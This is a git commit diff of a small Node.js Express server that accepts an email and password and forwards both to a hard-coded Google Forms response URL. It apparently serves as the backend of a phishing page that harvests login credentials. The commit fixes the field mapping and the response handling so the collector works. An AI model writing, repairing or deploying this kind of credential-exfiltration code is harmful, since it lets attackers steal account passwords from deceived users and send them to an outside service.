dccb386fc295180f14535711ffcd2ba8a64a9eda
xizot <nvnhat.17ck1@gmail.com>
2022-05-04 10:57:35 +0700

    fixbug

--- server.js
+++ server.js
@@ -5,7 +5,7 @@ const cors = require("cors");
 const formUrl =
   "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfcpGZzacm0X4W2whrDG_cTKALV_6HzN6REV8aZGS9eAT0LuA/formResponse";
 const fields = {
-  name: "entry.1542430435",
+  email: "entry.1542430435",
   password: "entry.1914285503",
 };
 const PORT = process.env.PORT || 5500;
@@ -27,20 +27,20 @@ app.post("/", (req, res) => {
     });
   }
   const form = new FormData();
-
   form.append(fields.email, email);
   form.append(fields.password, password);
-  form.submit(
-    "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfcpGZzacm0X4W2whrDG_cTKALV_6HzN6REV8aZGS9eAT0LuA/formResponse",
-    function (err, data) {
-      if (err) throw err;
-      console.log(data.statusCode);
 
+  form.submit(formUrl, function (err, data) {
+    if (data.statusCode === 200) {
       res.json({
-        success: "done",
+        success: true,
+      });
+    } else {
+      res.json({
+        success: false,
       });
     }
-  );
+  });
 });
 
 app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
